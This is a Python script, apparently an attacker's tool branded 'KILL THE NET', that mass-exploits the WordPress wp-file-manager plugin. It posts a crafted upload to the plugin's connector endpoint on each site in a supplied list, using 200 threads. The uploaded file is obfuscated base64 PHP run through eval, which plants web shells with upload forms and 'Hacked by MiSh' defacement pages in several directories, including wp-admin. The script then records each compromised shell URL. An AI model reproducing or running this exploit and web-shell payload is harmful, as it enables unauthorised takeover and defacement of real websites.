# -*- coding: utf-8 -*
#!/usr/bin/python
#####################################
##KILL THE NET##
##############[LIBS]###################
import requests, re, urllib2, os, sys, codecs, random				
from multiprocessing.dummy import Pool					     	
from time import time as timer	
import time				   		
from platform import system	
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init
from urlparse import urlparse
import warnings
import subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
reload(sys)  
sys.setdefaultencoding('utf8')
init(autoreset=True)
##########################################################################################
ktnred = '\033[31m'
ktngreen = '\033[32m'
ktn3yell = '\033[33m'
ktn4blue = '\033[34m'
ktn5purp = '\033[35m'
ktn6blueblue = '\033[36m'
ktn7grey = '\033[37m'
CEND = '\033[0m'		
#####################################
##########################################################################################
try:
	with codecs.open(sys.argv[1], mode='r', encoding='ascii', errors='ignore') as f:
		ooo = f.read().splitlines()
except IOError:
	pass
ooo = list((ooo))
##########################################################################################
se = requests.session()
Agent = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=---------------------------42474892822150178483835528074", "Connection": "close"}

def wp_exp(url):
	try:
		link = url + '/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php'
        	data1 = "-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"reqid\"\r\n\r\n1744f7298611ba\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"os.php\"\r\nContent-Type: application/php\r\n\r\n<?php eval(base64_decode('QGRlZmluZSgnU0VMRl9QQVRIJywgX19GSUxFX18pOwp1bmxpbmsoX19GSUxFX18pOwplcnJvcl9yZXBvcnRpbmcoMCk7CmZ1bmN0aW9uIFJhbmRvbVN0cmluZygkbGVuZ3RoID0gNykgewogICAgJGNoYXJhY3RlcnMgPSAnYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonOwogICAgJHJhbmRvbVMgPSAnJzsKICAgIGZvciAoJGkgPSAwOyAkaSA8ICRsZW5ndGg7ICRpKyspIHsKICAgICAgICAkcmFuZG9tUyAuPSAkY2hhcmFjdGVyc1tyYW5kKDAsIHN0cmxlbigkY2hhcmFjdGVycykgLSAxKV07CiAgICB9CiAgICByZXR1cm4gJHJhbmRvbVM7Cn0KJG5kb20gPSBSYW5kb21TdHJpbmcoKTsKJGZpbGVoID0gIk1pU2giOwokZmlsZXYgPSAiLi4vdXBsb2FkLnBocCI7CiRmaWxlID0gJzw/cGhwIGlmKGlzc2V0KCRfR0VUWyInLiRuZG9tLiciXSkpe2VjaG8iPGZvbnQgY29sb3I9I0ZGRkZGRj5bdW5hbWVdIi5waHBfdW5hbWUoKS4iWy91bmFtZV0iO2VjaG8iPGJyPjxmb250IGNvbG9yPSNGRkZGRkY+W2Rpcl0iLmdldGN3ZCgpLiJbL2Rpcl0iO2VjaG8iPGZvcm0gbWV0aG9kPXBvc3QgZW5jdHlwZT1tdWx0aXBhcnQvZm9ybS1kYXRhPiI7ZWNobyI8aW5wdXQgdHlwZT1maWxlIG5hbWU9Zj48aW5wdXQgbmFtZT12IHR5cGU9c3VibWl0IGlkPXYgdmFsdWU9dXA+PGJyPiI7aWYoJF9QT1NUWyJ2Il09PXVwKXtpZihAY29weSgkX0ZJTEVTWyJmIl1bInRtcF9uYW1lIl0sJF9GSUxFU1siZiJdWyJuYW1lIl0pKXtlY2hvIjxiPmJlcmhhc2lsPC9iPi0tPiIuJF9GSUxFU1siZiJdWyJuYW1lIl07fWVsc2V7ZWNobyI8Yj5nYWdhbCI7fX19Pz4nLiJcclxuIjsKJGZpbGUgLj0gIjx0aXRsZT5IYWNrZWQgYnkgTWlTaDwvdGl0bGU+PGJvZHkgYmdjb2xvcj1ibGFjaz48dGFibGUgd2lkdGg9MTAwJSBoZWlnaHQ9MTAwJT48dGQgYWxpZ249Y2VudGVyPjxzcGFuIHN0eWxlPSdmb250OiA0MHB4IHRhaG9tYTtzaXplOjQwcHg7Y29sb3I6d2hpdGU7dGV4dC1zaGFkb3c6IDBweCAwcHggNTBweDsnPjxzdHJvbmc+SGFja2VkIGJ5IE1pU2giOwokcj1mb3BlbigianIucGhwIiwgInciKTtmd3JpdGUoJHIsJGZpbGUpO2ZjbG9zZSgkcik7CiRyPWZvcGVuKCIuLi9qci5waHAiLCAidyIpO2Z3cml0ZSgkciwkZmlsZSk7ZmNsb3NlKCRyKTsKJHI9Zm9wZW4oIi4uLy4uL2pyLnBocCIsICJ3Iik7ZndyaXRlKCRyLCRmaWxlKTtmY2xvc2UoJHIpOwokcj1mb3BlbigiLi4vLi4vLi4vanIucGhwIiwgInciKTtmd3JpdGUoJHIsJGZpbGUpO2ZjbG9zZSgkcik7CiRyPWZvcGVuKCIuLi8uLi8uLi8uLi9qci5waHAiLCAidyIpO2Z3cml0ZSgkciwkZmlsZSk7ZmNsb3NlKCRyKTsKJHI9Zm9wZW4oIi4uLy4uLy4uLy4uLy4uL2pyLnBocCIsICJ3Iik7ZndyaXRlKCRyLCRmaWxlKTtmY2xvc2UoJHIpOwokcj1mb3BlbigiLi4vLi4vLi4vLi4vLi4vanIucGhwIiwgInciKTtmd3JpdGUoJHIsJGZpbGUpO2ZjbG9zZSgkcik7CiRyPWZvcGVuKCIuLi8uLi93cC1hZG1pbi9qci5waHAiLCAidyIpO2Z3cml0ZSgkciwkZmlsZSk7ZmNsb3NlKCRyKTsKJHI9Zm9wZW4oJGZpbGV2LCAidyIpO2Z3cml0ZSgkciwkZmlsZSk7ZmNsb3NlKCRyKTsKZWNobyAiSGFja2VkIEJ5IE1pU2g6Ii4kbmRvbTs=')); ?>\n\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\"mtime[]\"\r\n\r\n1597850374\r\n-----------------------------42474892822150178483835528074--\r\n"
		sss = requests.session()
		#Agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
		ktn1 = se.post(link, headers=Agent, data=data1, verify=False, timeout=20)
		if ktn1.status_code == 200 or ktn1.status_code == 500:
			ktnshell = url + '/wp-content/plugins/wp-file-manager/lib/files/os.php'
			check4 = se.get(ktnshell, headers=Agent, verify=False, timeout=20)
			if 'Hacked By MiSh' in check4.content:
				print(ktn5purp + '[SHELL UPLOADED]========> ' + url + CEND)
				open('index.txt', 'a').write(ktnshell + '\n')
				pass
			else:
				print(ktnred + '[SORRY CANT UPLOAD SHELL...]========> ' + url + CEND)
			
		else:
			print(ktnred + '[SORRY CANT UPLOAD SHELL...]========> ' + url + CEND)
			pass

	except:
		pass

##########################################################################################
##########################################################################################
def logo():
	clear = "\x1b[0m"
	colors = [36, 32, 34, 35, 31, 37]
	x = ''' 
				 FEDERATION BLACK HAT SYSTEM | IG: @_gghost666_ 

<-.(`-')  _                      (`-')      (`-').-> (`-')  _<-. (`-')_  (`-')  _(`-')      
 __( OO) (_)      <-.      <-.   ( OO).->   (OO )__  ( OO).-/   \( OO) ) ( OO).-/( OO).->   
'-'. ,--.,-(`-'),--. )   ,--. )  /    '._  ,--. ,'-'(,------.,--./ ,--/ (,------./    '._   
|  .'   /| ( OO)|  (`-') |  (`-')|'--...__)|  | |  | |  .---'|   \ |  |  |  .---'|'--...__) 
|      /)|  |  )|  |OO ) |  |OO )`--.  .--'|  `-'  |(|  '--. |  . '|  |)(|  '--. `--.  .--' 
|  .   '(|  |_/(|  '__ |(|  '__ |   |  |   |  .-.  | |  .--' |  |\    |  |  .--'    |  |    
|  |\   \|  |'->|     |' |     |'   |  |   |  | |  | |  `---.|  | \   |  |  `---.   |  |    
`--' '--'`--'   `-----'  `-----'    `--'   `--' `--' `------'`--'  `--'  `------'   `--'    
									  KILL THE NET
									 FB: fb/KtN.1990  
			   Note! : We Accept any responsibility for any illegal usage :). '''

	for N, line in enumerate(x.split("\n")):
		sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
		time.sleep(0.05)
		pass


logo()
##########################################################################################
def Main():
	try:
		
		start = timer()
		ThreadPool = Pool(200)
		Threads = ThreadPool.map(wp_exp, ooo)
		print('TIME TAKE: ' + str(timer() - start) + ' S')
	except:
		pass


if __name__ == '__main__':
	Main()
